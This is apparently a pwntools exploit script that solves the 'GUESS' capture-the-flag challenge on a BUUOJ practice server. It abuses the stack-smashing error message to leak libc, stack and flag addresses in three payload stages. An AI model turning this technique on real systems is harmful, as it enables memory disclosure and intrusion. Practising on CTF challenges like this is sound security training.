# coding=utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

#p = process('./GUESS')
p = remote('node3.buuoj.cn', 25282)
elf = ELF('./GUESS')

padding = 'a' * 0x128
puts_got = elf.got['puts']
payload1 = padding + p64(puts_got)
p.sendlineafter('Please type your guessing flag', payload1)

p.recvuntil('detected ***: ')
puts_addr = u64(p.recv(6).ljust(8, '\x00'))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
print('libc_base: ', hex(libc_base))
sleep(1)
############################### 2 #############################
environ_addr = libc_base + libc.dump('__environ')
payload2 = padding + p64(environ_addr)
p.sendlineafter('Please type your guessing flag', payload2)

p.recvuntil('detected ***: ')
stack_addr = u64(p.recv(6).ljust(8, '\x00'))
flag_addr= stack_addr - 0x168 
# 存放flag的地址距离environ地址的offset为0x168
print('flag_addr: ', hex(flag_addr))
sleep(1)
############################### 3 ############################

payload3 = padding + p64(flag_addr)
p.sendlineafter('Please type your guessing flag', payload3)

p.interactive()
